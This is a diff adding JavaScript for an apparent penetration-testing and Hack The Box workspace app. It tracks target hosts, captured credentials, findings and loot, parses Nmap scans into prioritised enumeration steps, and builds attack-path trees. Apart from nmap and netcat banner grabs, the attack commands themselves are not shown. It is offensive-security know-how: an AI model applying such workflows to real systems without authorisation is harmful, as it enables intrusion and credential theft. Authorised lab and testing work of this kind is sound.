+function esc(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;"); }
+function load(key, fallback){ try{ var v = localStorage.getItem(key); return v === null ? fallback : JSON.parse(v); }catch(e){ return fallback; } }
+function save(key, val){ try{ localStorage.setItem(key, JSON.stringify(val)); }catch(e){} }
+function debounce(fn, ms){ var t; return function(){ var a=arguments, c=this; clearTimeout(t); t=setTimeout(function(){ fn.apply(c,a); }, ms); }; }
+function uid(p){ return p + Date.now().toString(36) + Math.floor(Math.random()*1e6).toString(36); }
+
+/* ================= STORES (all start empty) ================= */
+var hosts = load("dex.hosts.v2", []);
+var currentHostId = load("dex.currentHost.v2", "");
+var creds = load("dex.creds.v2", []);
+var findings = load("dex.findings.v2", []);
+var loot = load("dex.loot.v2", []);
+var activity = load("dex.activity.v2", []);
+var theme = load("dex.theme.v2", "dark");
+
+var state = {
+  objective: load("dex.objective", "recon"),
+  cat: "all",
+  search: ""
+};
+function currentHost(){ return hosts.filter(function(h){ return h.id===currentHostId; })[0] || null; }
+function hostById(id){ return hosts.filter(function(h){ return h.id===id; })[0] || null; }
+function hostLabel(h){ return h ? (h.ip + (h.name ? " ("+h.name+")" : "")) : "None selected"; }
+function saveHosts(){ save("dex.hosts.v2", hosts); save("dex.currentHost.v2", currentHostId); }
+function saveCreds(){ save("dex.creds.v2", creds); }
+function saveFindings(){ save("dex.findings.v2", findings); }
+function saveLoot(){ save("dex.loot.v2", loot); }
+
+/* ================= ICONS (inline SVG, Lucide-style, hand-drawn) ================= */
+function icon(name, size){
+  var s = size || 14;
+  var p = {
+    grid:'<rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/>',
+    terminal:'<polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>',
+    search:'<circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.5" y2="16.5"/>',
+    link:'<path d="M10 13a5 5 0 0 0 7.5.5l3-3a5 5 0 0 0-7-7l-1.7 1.7"/><path d="M14 11a5 5 0 0 0-7.5-.5l-3 3a5 5 0 0 0 7 7l1.7-1.7"/>',
+    radar:'<circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="4"/><line x1="12" y1="12" x2="19" y2="5"/>',
+    box:'<path d="M21 8l-9-5-9 5v8l9 5 9-5z"/><path d="M3 8l9 5 9-5"/><path d="M12 13v8"/>',
+    file:'<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="9" y1="13" x2="15" y2="13"/><line x1="9" y1="17" x2="15" y2="17"/>',
+    key:'<circle cx="7.5" cy="15.5" r="4.5"/><line x1="11" y1="12" x2="20" y2="3"/><line x1="16" y1="7" x2="18.5" y2="9.5"/>',
+    flag:'<path d="M5 21V4"/><path d="M5 4h13l-2.5 4L18 12H5"/>',
+    server:'<rect x="2" y="3" width="20" height="7" rx="2"/><rect x="2" y="14" width="20" height="7" rx="2"/><line x1="6" y1="6.5" x2="6.5" y2="6.5"/><line x1="6" y1="17.5" x2="6.5" y2="17.5"/>',
+    sun:'<circle cx="12" cy="12" r="4"/><line x1="12" y1="2" x2="12" y2="4"/><line x1="12" y1="20" x2="12" y2="22"/><line x1="2" y1="12" x2="4" y2="12"/><line x1="20" y1="12" x2="22" y2="12"/><line x1="4.9" y1="4.9" x2="6.3" y2="6.3"/><line x1="17.7" y1="17.7" x2="19.1" y2="19.1"/><line x1="4.9" y1="19.1" x2="6.3" y2="17.7"/><line x1="17.7" y1="6.3" x2="19.1" y2="4.9"/>',
+    moon:'<path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/>',
+    zap:'<polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>',
+    edit:'<path d="M17 3a2.8 2.8 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5z"/>',
+    target:'<circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="5"/><circle cx="12" cy="12" r="1"/>',
+    shield:'<path d="M12 22s8-3.5 8-10V5l-8-3-8 3v7c0 6.5 8 10 8 10z"/>'
+  }[name] || "";
+  return '<svg width="'+s+'" height="'+s+'" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">'+p+'</svg>';
+}
+
+/* ================= TOASTS ================= */
+function toast(msg, kind){
+  var box = $("#toasts");
+  var t = document.createElement("div");
+  t.className = "toast" + (kind ? " " + kind : "");
+  t.textContent = msg;
+  box.appendChild(t);
+  setTimeout(function(){ if(t.parentNode) t.parentNode.removeChild(t); }, 2800);
+}
+
+/* Inline two-step delete confirmation (replaces the native dialog, which is
+   auto-dismissed in embedded/blob viewers and unreliable on mobile).
+   First click arms the button ("Click again to confirm"); a second click
+   within 4 seconds runs the delete. Otherwise it disarms itself. */
+function armDelete(btn, action){
+  if(!btn){ action(); return; }
+  if(btn.dataset.armed === "1"){
+    clearTimeout(btn._armTimer);
+    delete btn.dataset.armed;
+    btn.textContent = btn.dataset.origLabel || "Delete";
+    btn.classList.remove("btn-armed");
+    action();
+    return;
+  }
+  btn.dataset.armed = "1";
+  if(!btn.dataset.origLabel) btn.dataset.origLabel = btn.textContent;
+  btn.textContent = "Click again to confirm";
+  btn.classList.add("btn-armed");
+  btn._armTimer = setTimeout(function(){
+    delete btn.dataset.armed;
+    btn.textContent = btn.dataset.origLabel || "Delete";
+    btn.classList.remove("btn-armed");
+  }, 4000);
+}
+
+/* ================= ACTIVITY FEED ================= */
+function logActivity(text){
+  activity.unshift({ts: Date.now(), text: text});
+  if(activity.length > 50) activity.length = 50;
+  save("dex.activity.v2", activity);
+  renderActivity();
+}
+function renderActivity(){
+  var wrap = $("#activityList");
+  if(!wrap) return;
+  wrap.innerHTML = "";
+  if(!activity.length){
+    var e = document.createElement("div");
+    e.className = "empty";
+    e.textContent = "No activity yet. Actions you take — hosts added, findings saved, loot captured, reports generated — will show up here.";
+    wrap.appendChild(e);
+    return;
+  }
+  activity.forEach(function(a){
+    var div = document.createElement("div");
+    div.className = "feed-item";
+    div.innerHTML = '<span class="ts">'+esc(new Date(a.ts).toLocaleString())+'</span><br>'+esc(a.text);
+    wrap.appendChild(div);
+  });
+}
+
+/* ================= THEME ================= */
+function applyTheme(){
+  document.documentElement.setAttribute("data-theme", theme);
+  $("#themeBtn").innerHTML = (theme === "dark" ? icon("sun") : icon("moon")) + "<span>" + (theme === "dark" ? "Light" : "Dark") + "</span>";
+}
+function toggleTheme(){
+  theme = theme === "dark" ? "light" : "dark";
+  save("dex.theme.v2", theme);
+  applyTheme();
+}
+$("#themeBtn").addEventListener("click", toggleTheme);
+
+/* ================= NAV ================= */
+var PAGES = ["workspace","dashboard","worm","commands","chains","scan","vault","evidence","loot","notes","report"];
+var PAGE_LABELS = {workspace:"Workspace", dashboard:"Mission Dashboard", worm:"Worm Method", commands:"Command Database", chains:"Attack Path", scan:"Scan Analysis", vault:"HTB Vault", evidence:"Evidence", loot:"Loot Locker", notes:"Personal Notes", report:"Report"};
+function showPage(id){
+  PAGES.forEach(function(p){
+    var sec = document.getElementById("sec-"+p);
+    if(sec) sec.classList.toggle("active", p===id);
+  });
+  $$("#tabs .tab").forEach(function(t){ t.classList.toggle("active", t.getAttribute("data-page")===id); });
+  if(id==="scan") updateScanContext();
+  if(id==="workspace"){ renderWorkspace(); }
+  if(id==="chains"){ renderChains(); }
+  if(id==="report" && lastReportMd){ renderReportPreview(); }
+  window.scrollTo({top:0, behavior:"smooth"});
+}
+$$("#tabs .tab").forEach(function(t){
+  t.addEventListener("click", function(){ showPage(t.getAttribute("data-page")); });
+});
+$("#currentHostPill").addEventListener("click", function(){ showPage("workspace"); });
+
+/* ================= COPY ================= */
+function copyText(text, btn){
+  function done(){
+    toast("Copied to clipboard", "ok");
+    if(!btn) return;
+    var old = btn.textContent;
+    btn.textContent = "Copied";
+    btn.classList.add("done");
+    setTimeout(function(){ btn.textContent = old; btn.classList.remove("done"); }, 1200);
+  }
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(text).then(done, function(){ fallbackCopy(text); done(); });
+  } else { fallbackCopy(text); done(); }
+}
+function fallbackCopy(text){
+  var ta = document.createElement("textarea");
+  ta.value = text; ta.style.position = "fixed"; ta.style.opacity = "0";
+  document.body.appendChild(ta); ta.select();
+  try{ document.execCommand("copy"); }catch(e){}
+  document.body.removeChild(ta);
+}
+
+/* ================= COMMAND CARDS ================= */
+function cmdCard(c){
+  var div = document.createElement("div");
+  div.className = "cmd";
+  div.innerHTML =
+    '<div class="cat">'+esc(CATS[c.cat].label)+'</div>'+
+    '<h3>'+esc(c.title)+'</h3>'+
+    '<pre><code></code></pre>'+
+    '<p class="desc">'+esc(c.desc)+'</p>'+
+    '<p class="use"><b>Use case:</b> '+esc(c.use)+'</p>';
+  div.querySelector("code").textContent = c.cmd;
+  var btn = document.createElement("button");
+  btn.className = "copy-btn"; btn.type = "button"; btn.textContent = "Copy command";
+  btn.addEventListener("click", function(){ copyText(c.cmd, btn); });
+  div.appendChild(btn);
+  return div;
+}
+function renderCommandsInto(el, list){
+  el.innerHTML = "";
+  if(!list.length){
+    var e = document.createElement("div");
+    e.className = "empty";
+    e.textContent = "No commands match. Try a different search or category.";
+    el.appendChild(e);
+    return;
+  }
+  list.forEach(function(c){ el.appendChild(cmdCard(c)); });
+}
+function filteredCommands(){
+  var q = state.search.trim().toLowerCase();
+  return COMMANDS.filter(function(c){
+    if(state.cat !== "all" && c.cat !== state.cat) return false;
+    if(!q) return true;
+    return (c.title+" "+c.cmd+" "+c.desc+" "+c.use+" "+CATS[c.cat].label).toLowerCase().indexOf(q) !== -1;
+  });
+}
+function renderCommands(){
+  renderCommandsInto($("#cmdList"), filteredCommands());
+  $$("#catChips .chip-btn").forEach(function(b){
+    b.classList.toggle("active", b.getAttribute("data-cat")===state.cat);
+  });
+}
+(function buildCatChips(){
+  var wrap = $("#catChips");
+  var all = [{k:"all", label:"All"}];
+  Object.keys(CATS).forEach(function(k){ all.push({k:k, label:CATS[k].label}); });
+  all.forEach(function(c){
+    var b = document.createElement("button");
+    b.type = "button"; b.className = "btn-ghost btn-sm chip-btn";
+    b.setAttribute("data-cat", c.k); b.textContent = c.label;
+    if(c.k==="all") b.classList.add("active");
+    b.addEventListener("click", function(){ state.cat = c.k; renderCommands(); });
+    wrap.appendChild(b);
+  });
+})();
+
+/* ================= SCAN PARSING + DETECTION RULES ================= */
+function parseScan(text){
+  var out = [];
+  var seen = {};
+  var re = /(\d{1,5})\/(tcp|udp)\s+open\s+([^\s]+)/gi;
+  var m;
+  while((m = re.exec(text)) !== null){
+    var port = parseInt(m[1], 10);
+    if(port < 1 || port > 65535) continue;
+    var key = port + "/" + m[2].toLowerCase();
+    if(seen[key]) continue;
+    seen[key] = true;
+    out.push({port: port, proto: m[2].toLowerCase(), service: m[3].toLowerCase()});
+  }
+  return out;
+}
+function ruleForPort(port){
+  return PORT_RULES[port] || null;
+}
+function detectionGroups(services){
+  /* returns [{pri, items:[{port, proto, service, rule}]}] sorted by priority */
+  var groups = {};
+  services.forEach(function(s){
+    var rule = ruleForPort(s.port);
+    var pri = rule ? rule.pri : 3;
+    if(!groups[pri]) groups[pri] = [];
+    groups[pri].push({port: s.port, proto: s.proto, service: s.service, rule: rule});
+  });
+  return Object.keys(groups).map(function(k){ return {pri: +k, items: groups[k]}; })
+    .sort(function(a,b){ return a.pri - b.pri; });
+}
+function renderDetectionCards(el, services){
+  el.innerHTML = "";
+  if(!services.length){
+    var p = document.createElement("p");
+    p.className = "muted small";
+    p.textContent = "Nothing detected yet.";
+    el.appendChild(p);
+    return;
+  }
+  services.forEach(function(s){
+    var rule = ruleForPort(s.port);
+    var card = document.createElement("div");
+    card.className = "detect-card";
+    var h = document.createElement("h4");
+    h.textContent = s.port + "/" + s.proto + " — " + (rule ? rule.title : "Unrecognized service (" + s.service + ")");
+    card.appendChild(h);
+    var adv = document.createElement("p");
+    adv.textContent = rule ? rule.advice : "Unrecognized service — manual review. Check the banner with nmap -sV and nc before deciding what to try.";
+    card.appendChild(adv);
+    var cmds = rule ? rule.cmds : [{t:"Banner grab", c:"nmap -sV -p " + s.port + " <IP>"}, {t:"Netcat banner", c:"nc -v <IP> " + s.port}];
+    cmds.forEach(function(rc){
+      var row = document.createElement("div");
+      row.className = "row";
+      row.style.marginBottom = "6px";
+      var code = document.createElement("code");
+      code.textContent = rc.c;
+      code.style.flex = "1";
+      var btn = document.createElement("button");
+      btn.type = "button"; btn.className = "copy-btn"; btn.textContent = "Copy";
+      btn.addEventListener("click", function(){ copyText(rc.c, btn); });
+      row.appendChild(code); row.appendChild(btn);
+      card.appendChild(row);
+    });
+    el.appendChild(card);
+  });
+}
+function renderRecs(el, services){
+  el.innerHTML = "";
+  if(!services.length){
+    var p = document.createElement("p");
+    p.className = "muted small";
+    p.textContent = "Paste a scan to see prioritized enumeration paths.";
+    el.appendChild(p);
+    return;
+  }
+  var flow = document.createElement("p");
+  flow.className = "small muted";
+  flow.textContent = "Flow: Detected Services \u2192 Suggested Paths \u2192 Attack Tree \u2192 Evidence Collection";
+  el.appendChild(flow);
+  detectionGroups(services).forEach(function(g){
+    var card = document.createElement("div");
+    card.className = "detect-card";
+    var h = document.createElement("h4");
+    h.innerHTML = '<span class="pri-badge pri-' + g.pri + '">PRIORITY ' + g.pri + '</span>' +
+      esc(g.items.map(function(i){ return (ruleForPort(i.port) ? ruleForPort(i.port).service : i.service) + " (" + i.port + ")"; }).join(", "));
+    card.appendChild(h);
+    g.items.forEach(function(i){
+      var rule = ruleForPort(i.port);
+      var cmds = rule ? rule.cmds : [{t:"Banner grab", c:"nmap -sV -p " + i.port + " <IP>"}];
+      cmds.forEach(function(rc){
+        var row = document.createElement("div");
+        row.className = "row";
+        row.style.marginBottom = "6px";
+        var code = document.createElement("code");
+        code.textContent = rc.c;
+        code.style.flex = "1";
+        var btn = document.createElement("button");
+        btn.type = "button"; btn.className = "copy-btn"; btn.textContent = "Copy";
+        btn.addEventListener("click", function(){ copyText(rc.c, btn); });
+        row.appendChild(code); row.appendChild(btn);
+        card.appendChild(row);
+      });
+    });
+    el.appendChild(card);
+  });
+}
+
+/* ================= MISSION DASHBOARD ================= */
+function renderObjectives(){
+  var grid = $("#objGrid");
+  grid.innerHTML = "";
+  Object.keys(OBJECTIVES).forEach(function(k){
+    var o = OBJECTIVES[k];
+    var b = document.createElement("button");
+    b.type = "button"; b.className = "obj-btn" + (k===state.objective ? " active" : "");
+    b.innerHTML = '<span class="t">'+esc(o.label)+'</span><span class="d">'+esc(o.blurb)+'</span>';
+    b.addEventListener("click", function(){ selectObjective(k); });
+    grid.appendChild(b);
+  });
+}
+function selectObjective(k){
+  state.objective = k;
+  save("dex.objective", k);
+  renderObjectives();
+  renderDashboard();
+  updateScanContext();
+  updateAiContext();
+}
+function renderDashboard(){
+  var o = OBJECTIVES[state.objective];
+  $("#objTitle").textContent = o.label;
+  var wf = $("#objWorkflow"); wf.innerHTML = "";
+  o.workflow.forEach(function(step){
+    var li = document.createElement("li"); li.textContent = step; wf.appendChild(li);
+  });
+  var nx = $("#objNext"); nx.innerHTML = "";
+  o.next.forEach(function(n){
+    var li = document.createElement("li"); li.textContent = n; nx.appendChild(li);
+  });
+  renderCommandsInto($("#objCommands"), COMMANDS.filter(function(c){ return c.cat===state.objective; }));
+  renderDynamicRecs();
+}
+function renderDynamicRecs(){
+  var services = [];
+  var scanText = $("#scanInput") ? $("#scanInput").value : "";
+  if(scanText && scanText.trim()) services = parseScan(scanText);
+  if(!services.length){
+    var h = currentHost();
+    if(h && h.services && h.services.length) services = h.services.map(function(s){ return {port: s.port, proto: s.proto || "tcp", service: s.service}; });
+  }
+  var wrap = $("#dynRecs");
+  if(!services.length){
+    wrap.innerHTML = '<p class="muted">No scan data yet. Paste Nmap output in Scan Analysis, or add services to the current host, and prioritized enumeration paths will appear here.</p>';
+    return;
+  }
+  wrap.innerHTML = "";
+  var intro = document.createElement("p");
+  intro.className = "small muted";
+  intro.textContent = "Detected: " + services.map(function(s){ return s.port + "/" + s.proto + " (" + s.service + ")"; }).join(", ");
+  wrap.appendChild(intro);
+  renderRecs(wrap, services);
+}
+function updateScanContext(){
+  var el = $("#scanContext");
+  if(el) el.textContent = OBJECTIVES[state.objective].label;
+  var sh = $("#scanHost");
+  if(sh){ var h = currentHost(); sh.textContent = h ? hostLabel(h) : "None selected"; }
+}
+
+/* ================= WORM METHOD ================= */
+var wormState = load("dex.worm.v1", [false,false,false,false,false]);
+function renderWorm(){
+  var wrap = $("#wormSteps");
+  wrap.innerHTML = "";
+  WORM_STEPS.forEach(function(s, i){
+    var div = document.createElement("div");
+    div.className = "worm-step" + (wormState[i] ? " done" : "");
+    var cb = document.createElement("input");
+    cb.type = "checkbox"; cb.checked = !!wormState[i];
+    cb.setAttribute("aria-label", "Phase " + (i+1) + ": " + s.t);
+    cb.addEventListener("change", function(){
+      wormState[i] = cb.checked;
+      save("dex.worm.v1", wormState);
+      renderWorm();
+    });
+    var body = document.createElement("div");
+    body.innerHTML = '<span class="n">PHASE '+(i+1)+'</span><h3>'+esc(s.t)+'</h3><p>'+esc(s.d)+'</p>';
+    div.appendChild(cb); div.appendChild(body);
+    wrap.appendChild(div);
+  });
+  var done = wormState.filter(Boolean).length;
+  $("#wormBar").style.width = (done / WORM_STEPS.length * 100) + "%";
+  $("#wormText").textContent = done + " / " + WORM_STEPS.length + " complete" + (done===WORM_STEPS.length ? " — method complete" : "");
+}
+$("#wormReset").addEventListener("click", function(){
+  wormState = [false,false,false,false,false];
+  save("dex.worm.v1", wormState);
+  renderWorm();
+  toast("Worm Method reset", "ok");
+});
+
+/* ================= GLOBAL SEARCH ================= */
+$("#globalSearch").addEventListener("input", debounce(function(e){
+  state.search = e.target.value;
+  state.cat = "all";
+  renderCommands();
+  if(!document.getElementById("sec-commands").classList.contains("active")){
+    showPage("commands");
+  }
+}, 200));
+
+/* Shorten the header search hint below 600px so it never truncates mid-word. */
+function fitSearchHint(){
+  var s = $("#globalSearch");
+  if(!s) return;
+  s.placeholder = window.matchMedia("(max-width:600px)").matches ? "Search commands…" : "Search commands…  (Ctrl+K)";
+}
+window.addEventListener("resize", fitSearchHint);
+fitSearchHint();
+
+/* ================= HOSTS (asset-centric core) ================= */
+var editingHostId = null;
+function parseServicesInput(text){
+  var out = [];
+  text.split(",").forEach(function(part){
+    var m = part.trim().match(/^(\d{1,5})\s*\/\s*([A-Za-z0-9._-]+)/);
+    if(m){
+      var port = parseInt(m[1], 10);
+      if(port >= 1 && port <= 65535) out.push({port: port, proto: "tcp", service: m[2].toLowerCase()});
+    }
+  });
+  return out;
+}
+function refreshHostSelects(){
+  [["#eHost"],["#lHost"],["#eFilterHost"],["#lFilterHost"]].forEach(function(pair){
+    var sel = $(pair[0]);
+    if(!sel) return;
+    var cur = sel.value;
+    var first = sel.querySelector("option");
+    sel.innerHTML = "";
+    if(first && first.value === ""){
+      var all = document.createElement("option");
+      all.value = ""; all.textContent = first.textContent;
+      sel.appendChild(all);
+    } else {
+      var none = document.createElement("option");
+      none.value = ""; none.textContent = "No host";
+      sel.appendChild(none);
+    }
+    hosts.forEach(function(h){
+      var o = document.createElement("option");
+      o.value = h.id; o.textContent = hostLabel(h);
+      sel.appendChild(o);
+    });
+    if(cur) sel.value = cur;
+  });
+}
+function renderHostList(){
+  var wrap = $("#hostList");
+  wrap.innerHTML = "";
+  if(!hosts.length){
+    var e = document.createElement("div");
+    e.className = "empty";
+    e.textContent = "No hosts yet. Add your first host below.";
+    wrap.appendChild(e);
+    return;
+  }
+  hosts.slice().sort(function(a,b){ return b.ts - a.ts; }).forEach(function(h){
+    var b = document.createElement("button");
+    b.type = "button";
+    b.className = "host-item" + (h.id===currentHostId ? " active" : "");
+    b.innerHTML = '<span class="t">' + esc(h.ip) + '</span><span class="d"><span class="status-dot st-' + esc(h.status) + '"></span>' + esc(h.status) + (h.name ? " · " + esc(h.name) : "") + ' · ' + (h.services ? h.services.length : 0) + ' service(s)</span>';
+    b.addEventListener("click", function(){ setCurrentHost(h.id); });
+    wrap.appendChild(b);
+  });
+}
+function setCurrentHost(id){
+  currentHostId = id;
+  save("dex.currentHost.v2", currentHostId);
+  renderWorkspace();
+  updateScanContext();
+  updateAiContext();
+  renderChains();
+  var h = currentHost();
+  if(h) toast("Current host: " + h.ip, "ok");
+}
+function renderWorkspace(){
+  /* counts */
+  var counts = [
+    ["Hosts", hosts.length],
+    ["Findings", findings.length],
+    ["Credentials", creds.length],
+    ["Loot items", loot.length],
+    ["Notes", notes.length],
+    ["Vault machines", vault.length]
+  ];
+  var cw = $("#wsCounts");
+  cw.innerHTML = "";
+  counts.forEach(function(c){
+    var d = document.createElement("div");
+    d.className = "count-card";
+    d.innerHTML = '<div class="n">'+c[1]+'</div><div class="l">'+esc(c[0])+'</div>';
+    cw.appendChild(d);
+  });
+  renderHostList();
+  renderActivity();
+  /* current host detail */
+  var h = currentHost();
+  var pill = $("#currentHostText");
+  var dot = $("#currentHostDot");
+  if(h){
+    pill.textContent = h.ip + (h.name ? " — " + h.name : "");
+    dot.className = "status-dot st-" + h.status;
+  } else {
+    pill.textContent = "No host selected";
+    dot.className = "status-dot st-Down";
+  }
+  var box = $("#wsCurrentHost");
+  box.innerHTML = "";
+  if(!h){
+    var p = document.createElement("p");
+    p.className = "muted";
+    p.textContent = "No host selected. Add a host on the left, or click one in the list to make it current everywhere (scan context, AI context, attack path).";
+    box.appendChild(p);
+  } else {
+    var hostCreds = creds.filter(function(c){ return c.hostId === h.id; });
+    var hostFindings = findings.filter(function(f){ return f.hostId === h.id; });
+    var hostLoot = loot.filter(function(l){ return l.hostId === h.id; });
+    var html = '<p><b style="font-family:var(--mono)">' + esc(h.ip) + '</b>' + (h.name ? ' — ' + esc(h.name) : '') + '</p>' +
+      '<p class="muted small">Status: <b style="color:var(--text)">' + esc(h.status) + '</b> &middot; Foothold: <b style="color:var(--text)">' + esc(h.foothold) + '</b> &middot; PrivEsc: <b style="color:var(--text)">' + esc(h.privesc) + '</b></p>';
+    html += '<p class="small muted">Services: ' + (h.services && h.services.length ? "" : "none recorded yet") + '</p>';
+    var svc = document.createElement("div");
+    svc.innerHTML = html;
+    if(h.services) h.services.forEach(function(s){
+      var tag = document.createElement("span");
+      tag.className = "svc-tag";
+      tag.textContent = s.port + "/" + (s.proto || "tcp") + " " + s.service;
+      svc.appendChild(tag);
+    });
+    box.appendChild(svc);
+    var sum = document.createElement("p");
+    sum.className = "small muted";
+    sum.textContent = hostCreds.length + " credential(s) · " + hostFindings.length + " finding(s) · " + hostLoot.length + " loot item(s) on this host.";
+    box.appendChild(sum);
+    var row = document.createElement("div");
+    row.className = "row";
+    var edit = document.createElement("button");
+    edit.type = "button"; edit.className = "btn-ghost btn-sm"; edit.textContent = "Edit host";
+    edit.addEventListener("click", function(){ startEditHost(h.id); });
+    var del = document.createElement("button");
+    del.type = "button"; del.className = "btn-ghost btn-sm btn-danger"; del.textContent = "Delete host";
+    del.addEventListener("click", function(){ deleteHost(h.id, this); });
+    row.appendChild(edit); row.appendChild(del);
+    box.appendChild(row);
+  }
+  refreshHostSelects();
+}
+function clearHostForm(){
+  editingHostId = null;
+  ["hIp","hName","hServices"].forEach(function(id){ document.getElementById(id).value = ""; });
+  $("#hStatus").selectedIndex = 0;
+  $("#hFoothold").value = "none";
+  $("#hPrivesc").value = "none";
+  $("#hostFormTitle").textContent = "Add a host";
+  $("#hCancelEdit").classList.add("hidden");
+  $("#hMsg").textContent = "";
+}
+function startEditHost(id){
+  var h = hostById(id);
+  if(!h) return;
+  editingHostId = id;
+  $("#hIp").value = h.ip;
+  $("#hName").value = h.name || "";
+  $("#hStatus").value = h.status;
+  $("#hFoothold").value = h.foothold;
+  $("#hPrivesc").value = h.privesc;
+  $("#hServices").value = (h.services || []).map(function(s){ return s.port + "/" + s.service; }).join(", ");
+  $("#hostFormTitle").textContent = "Edit host";
+  $("#hCancelEdit").classList.remove("hidden");
+  $("#hIp").focus();
+}
+function deleteHost(id, btn){
+  var h = hostById(id);
+  if(!h) return;
+  armDelete(btn, function(){
+    hosts = hosts.filter(function(x){ return x.id !== id; });
+    findings.forEach(function(f){ if(f.hostId === id) f.hostId = ""; });
+    creds.forEach(function(c){ if(c.hostId === id) c.hostId = ""; });
+    loot.forEach(function(l){ if(l.hostId === id) l.hostId = ""; });
+    if(currentHostId === id) currentHostId = "";
+    saveHosts(); saveFindings(); saveCreds(); saveLoot();
+    clearHostForm();
+    renderWorkspace(); renderEvidence(); renderLoot(); updateAiContext(); renderChains(); updateScanContext();
+    logActivity("Host deleted: " + h.ip);
+    toast("Host deleted", "ok");
+  });
+}
+$("#hSave").addEventListener("click", function(){
+  var ip = $("#hIp").value.trim();
+  if(!ip){ $("#hMsg").textContent = "Host / IP is required."; $("#hIp").focus(); return; }
+  var rec = {
+    id: editingHostId || uid("h"),
+    ts: editingHostId ? (hostById(editingHostId) || {}).ts || Date.now() : Date.now(),
+    ip: ip,
+    name: $("#hName").value.trim(),
+    status: $("#hStatus").value,
+    foothold: $("#hFoothold").value,
+    privesc: $("#hPrivesc").value,
+    services: parseServicesInput($("#hServices").value)
+  };
+  if(editingHostId){
+    hosts = hosts.map(function(x){ return x.id===editingHostId ? rec : x; });
+    $("#hMsg").textContent = "Updated.";
+    logActivity("Host updated: " + ip);
+  } else {
+    hosts.push(rec);
+    $("#hMsg").textContent = "Host saved.";
+    logActivity("Host added: " + ip);
+  }
+  saveHosts();
+  clearHostForm();
+  setCurrentHost(rec.id);
+  toast("Host saved", "ok");
+});
+$("#hCancelEdit").addEventListener("click", clearHostForm);
+$("#activityClear").addEventListener("click", function(){
+  activity = [];
+  save("dex.activity.v2", activity);
+  renderActivity();
+});
+$("#qaReport").addEventListener("click", function(){ showPage("report"); generateReport(); });
+$("#qaScan").addEventListener("click", function(){ showPage("scan"); });
+$("#qaEvidence").addEventListener("click", function(){ showPage("evidence"); $("#eTitle").focus(); });
+$("#qaLoot").addEventListener("click", function(){ showPage("loot"); });
+
+/* ================= ATTACK PATH (dynamic tree) ================= */
+function chainCard(title, nodes, isExample){
+  var d = document.createElement("details");
+  d.className = "chain";
+  d.open = true;
+  var sum = document.createElement("summary");
+  sum.textContent = title + (isExample ? "  — Example path" : "") + "  (" + nodes.length + " steps)";
+  d.appendChild(sum);
+  var body = document.createElement("div");
+  body.className = "chain-body";
+  nodes.forEach(function(node, ni){
+    var nd = document.createElement("div");
+    nd.className = "node";
+    nd.innerHTML = "<b>" + (ni+1) + ". " + esc(node.n) + "</b><p>" + esc(node.d) + "</p>";
+    body.appendChild(nd);
+    if(ni < nodes.length-1){
+      var ar = document.createElement("div");
+      ar.className = "node-arrow";
+      ar.textContent = "\u2193";
+      body.appendChild(ar);
+    }
+  });
+  d.appendChild(body);
+  return d;
+}
+function treeNode(label, sub, children){
+  var li = document.createElement("li");
+  var box = document.createElement("div");
+  box.className = "tree-node";
+  box.innerHTML = "<b>" + esc(label) + "</b>" + (sub ? ' <span class="sub">' + esc(sub) + "</span>" : "");
+  li.appendChild(box);
+  if(children && children.length){
+    var ul = document.createElement("ul");
+    ul.className = "tree";
+    children.forEach(function(c){ ul.appendChild(c); });
+    li.appendChild(ul);
+  }
+  return li;
+}
+function renderChains(){
+  var wrap = $("#chainList");
+  wrap.innerHTML = "";
+  var h = currentHost();
+  var hasData = h && ((h.services && h.services.length) || findings.some(function(f){ return f.hostId === h.id; }) || creds.some(function(c){ return c.hostId === h.id; }) || loot.some(function(l){ return l.hostId === h.id; }));
+  if(hasData){
+    var head = document.createElement("p");
+    head.className = "muted";
+    head.textContent = "Attack tree for " + hostLabel(h) + " — built from its recorded services, findings, credentials, and access.";
+    wrap.appendChild(head);
+    var hostFindings = findings.filter(function(f){ return f.hostId === h.id; });
+    var hostCreds = creds.filter(function(c){ return c.hostId === h.id; });
+    var hostLoot = loot.filter(function(l){ return l.hostId === h.id; });
+    var rootUl = document.createElement("ul");
+    rootUl.className = "tree";
+    var svcChildren = [];
+    (h.services || []).forEach(function(s){
+      var rule = ruleForPort(s.port);
+      svcChildren.push(treeNode(s.port + "/" + (s.proto || "tcp") + " " + s.service, rule ? rule.title : "unrecognized — manual review", null));
+    });
+    var findChildren = hostFindings.map(function(f){ return treeNode(f.title, f.severity + " severity", null); });
+    var credChildren = hostCreds.map(function(c){ return treeNode(c.username, (c.service || "credential") + " — password stored in Loot Locker", null); });
+    var lootChildren = hostLoot.map(function(l){ return treeNode(lootLabel(l), l.kind, null); });
+    var accessChildren = [];
+    if(h.foothold && h.foothold !== "none") accessChildren.push(treeNode("Foothold: " + h.foothold, "", null));
+    if(h.privesc && h.privesc !== "none") accessChildren.push(treeNode("PrivEsc: " + h.privesc, "", null));
+    var children = [];
+    if(svcChildren.length) children.push(treeNode("Services", svcChildren.length + " open", svcChildren));
+    if(findChildren.length) children.push(treeNode("Findings", findChildren.length + " recorded", findChildren));
+    if(credChildren.length) children.push(treeNode("Credentials", credChildren.length + " stored", credChildren));
+    if(lootChildren.length) children.push(treeNode("Loot", lootChildren.length + " item(s)", lootChildren));
+    if(accessChildren.length) children.push(treeNode("Access", "", accessChildren));
+    var rootLi = document.createElement("li");
+    rootLi.className = "tree-root";
+    var rootBox = document.createElement("div");
+    rootBox.className = "tree-node";
